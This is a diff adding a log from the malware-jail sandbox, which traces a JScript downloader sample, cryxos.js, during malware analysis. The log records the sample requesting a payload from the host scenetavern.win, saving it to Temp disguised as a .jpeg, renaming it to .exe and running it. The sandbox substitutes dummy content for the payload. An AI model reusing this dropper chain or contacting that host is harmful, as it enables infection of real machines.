@@ -1,0 +1,70 @@
+19 Oct 19:42:06 - mailware-jail, a malware sandbox ver. 0.15
+19 Oct 19:42:06 - ------------------------
+19 Oct 19:42:06 - Arguments: /home/maik/gitHub/TFM/fame/storage/74f1b733171cbd7d6b6105096fa48e5b5398fa67eb01956e015c8b9d1c0ee441/cryxos.js
+19 Oct 19:42:06 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+19 Oct 19:42:06 - Malware files: /home/maik/gitHub/TFM/fame/storage/74f1b733171cbd7d6b6105096fa48e5b5398fa67eb01956e015c8b9d1c0ee441/cryxos.js
+19 Oct 19:42:06 - Execution timeout set to: 60 seconds
+19 Oct 19:42:06 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+19 Oct 19:42:06 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+19 Oct 19:42:06 - Download from remote server: No
+19 Oct 19:42:06 - ==> Preparing Sandbox environment.
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+19 Oct 19:42:06 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+19 Oct 19:42:06 - ==> Executing malware file(s). =========================================
+19 Oct 19:42:06 -  => Executing: /home/maik/gitHub/TFM/fame/storage/74f1b733171cbd7d6b6105096fa48e5b5398fa67eb01956e015c8b9d1c0ee441/cryxos.js verbosely, reporting silent catches
+19 Oct 19:42:06 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_74f1b733171cbd7d6b6105096fa48e5b5398fa67eb01956e015c8b9d1c0ee441_cryxos.js
+19 Oct 19:42:06 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_74f1b733171cbd7d6b6105096fa48e5b5398fa67eb01956e015c8b9d1c0ee441_cryxos.js
+19 Oct 19:42:06 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/74f1b733171cbd7d6b6105096fa48e5b5398fa67eb01956e015c8b9d1c0ee441/cryxos.js'
+19 Oct 19:42:06 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/74f1b733171cbd7d6b6105096fa48e5b5398fa67eb01956e015c8b9d1c0ee441/cryxos.js,xyz'
+19 Oct 19:42:06 - ActiveXObject(MSXML2.XMLHTTP)
+19 Oct 19:42:06 - new MSXML2.XMLHTTP[14]
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].onreadystatechange = (undefined) 'undefined'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].open(GET,http://scenetavern.win/support.php?f=1.dat,false)
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].method = (string) 'GET'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].url = (string) 'http://scenetavern.win/support.php?f=1.dat'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].async = (boolean) 'false'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].send(undefined)
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14] Not sending data, if you want to interact with remote server, set --down
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].status = (number) '200'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].readystate = (number) '4'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].onreadystatechange.get() => (undefined) 'undefined'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].send(undefined) finished
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].status.get() => (number) '200'
+19 Oct 19:42:06 - MSXML2.XMLHTTP[14].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+19 Oct 19:42:06 - ActiveXObject(Scripting.FileSystemObject)
+19 Oct 19:42:06 - new Scripting.FileSystemObject[15]
+19 Oct 19:42:06 - new DriveObject[16](C:)
+19 Oct 19:42:06 - DriveObject[16](C:).name = (string) 'C:'
+19 Oct 19:42:06 - new Collection[17]
+19 Oct 19:42:06 - Scripting.FileSystemObject[15].GetSpecialFolder(2) => C:\Users\User\AppData\Local\Temp\
+19 Oct 19:42:06 - ActiveXObject(ADODB.Stream)
+19 Oct 19:42:06 - new ADODB_Stream[18]
+19 Oct 19:42:06 - ADODB_Stream[18].Open()
+19 Oct 19:42:06 - ADODB_Stream[18].type = (number) '1'
+19 Oct 19:42:06 - ADODB_Stream[18].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+19 Oct 19:42:06 - ADODB_Stream[18].Write(str) - 11202 bytes
+19 Oct 19:42:06 - ADODB_Stream[18].size = (number) '11202'
+19 Oct 19:42:06 - ADODB_Stream[18].position = (number) '0'
+19 Oct 19:42:06 - ADODB_Stream[18].SaveToFile(C:\Users\User\AppData\Local\Temp\\1nv46b1d3.jpeg, 2)
+19 Oct 19:42:06 - ADODB_Stream[18].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+19 Oct 19:42:06 - ADODB_Stream[18].Close()
+19 Oct 19:42:07 - ActiveXObject(Scripting.FileSystemObject)
+19 Oct 19:42:07 - new Scripting.FileSystemObject[19]
+19 Oct 19:42:07 - new DriveObject[20](C:)
+19 Oct 19:42:07 - DriveObject[20](C:).name = (string) 'C:'
+19 Oct 19:42:07 - new Collection[21]
+19 Oct 19:42:07 - Scripting.FileSystemObject[19].CopyFile(C:\Users\User\AppData\Local\Temp\\1nv46b1d3.jpeg, C:\Users\User\AppData\Local\Temp\\1nv46b1d3.exe)
+19 Oct 19:42:07 - ActiveXObject(WScript.Shell)
+19 Oct 19:42:07 - new WScript.Shell[22]
+19 Oct 19:42:07 - WScript.Shell[22].Run(C:\Users\User\AppData\Local\Temp\\1nv46b1d3.exe, undefined, undefined)
+19 Oct 19:42:07 - ==> Cleaning up sandbox.
+19 Oct 19:42:07 - ==> Script execution finished, dumping sandbox environment to a file.
+19 Oct 19:42:07 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+19 Oct 19:42:07 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp__1nv46b1d3.jpeg
